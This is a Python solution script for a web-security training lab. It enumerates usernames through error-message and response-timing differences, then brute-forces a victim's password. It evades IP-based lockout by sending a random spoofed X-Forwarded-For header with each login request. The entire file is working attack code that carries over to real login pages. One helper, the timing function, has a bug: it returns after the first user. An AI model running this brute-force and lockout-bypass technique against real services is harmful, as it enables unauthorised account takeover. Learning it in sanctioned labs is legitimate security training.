# This lab is vulnerable due to a logic flaw in its password brute-force protection. 
# To solve the lab, brute-force the victim's password, then log in and access their account page.
# notice that in this lab if you start brute forcing the password your ip will be blocked 
# in this code we generated a new ip address for each post request to bypass the ip block protection.

from bs4 import BeautifulSoup
import time
import requests
from random import randint
# Set the URL and necessary headers
url = 'https://0a5f00270333913a84ce22c3001f00ae.web-security-academy.net/login'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
cookies = {'session': 'zwVrbm2oeJqeVcamR36BtzOHe3f6oefd'}

# Generate different IP addresses to simulate different users
def random_ip_generator():
	return "{}.{}.{}.{}".format(randint(0,255), randint(0,255), randint(0,255), randint(0,255))

# Retrieve the word list
passwords = []
with open("password.txt", "r") as f:
    passwords = f.read().splitlines()
users = []

with open("user.txt","r") as fl:
    users =fl.read().splitlines(
    )

#find the diffrent error massage so we can find the correct username in this example,
#the Error massage for an valid username and invalid password is "Invalid username or password"
def findDiffrentError():
    for user in users:
        ip = random_ip_generator()
        data = {'username': user, 'password': "000"}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'X-Forwarded-For': ip
        }
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.find('p', class_='is-warning').text.strip()
        if error_message:
            print(error_message)

def findDiffrentTime():
    #list of all response times to find the longest one
    rt=[]
    for user in users:
        ip = random_ip_generator()
        data = {'username': user, 'password': "000"}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'X-Forwarded-For': ip
        }
        
        start_time = time.time()
        requests.post(url, data=data, cookies=cookies, headers=headers)
        end_time = time.time()
        response_time = end_time - start_time
        rt.append(response_time)
        print(response_time,user)
        return max(rt)
    
    
def findUserLab2(maxTime):
    for user in users:
        ip = random_ip_generator()
        data = {'username': user, 'password': "000"}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'X-Forwarded-For': ip
        }
        start_time = time.time()
        requests.post(url, data=data, cookies=cookies, headers=headers)
        end_time = time.time()
        response_time = end_time - start_time
        if response_time >maxTime:
            print(f'{ip} {user} is The One!.')
            return user
        else:
            print(f'its not {user}')
            
def findUserLab1():
    for user in users:
        ip = random_ip_generator()
        data = {'username': user, 'password': "000"}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'X-Forwarded-For': ip
        }
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        
        #for extracting the error massage
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.find('p', class_='is-warning').text.strip()
        
        
        if error_message =="Invalid username or password":
            print(f'{ip} {user} is The One!.')
            return user
        else:
            print(f'its not {user}')
def findPass(username):
    for password in passwords:
        ip = random_ip_generator()
        data = {'username': username, 'password': password}

        # Set up the headers with the modified "X-Forwarded-for" header
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'X-Forwarded-For': ip
        }

        # Submit the login request with the given password and IP
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        if 'Invalid' in response.text:
            print(f'{ip} {password} was not successfully logged in.')
        else:
            print(f'Login Successful with password: {password}')
            break


#findPass(findUserLab2(findDiffrentTime()))
findPass(findUserLab1())
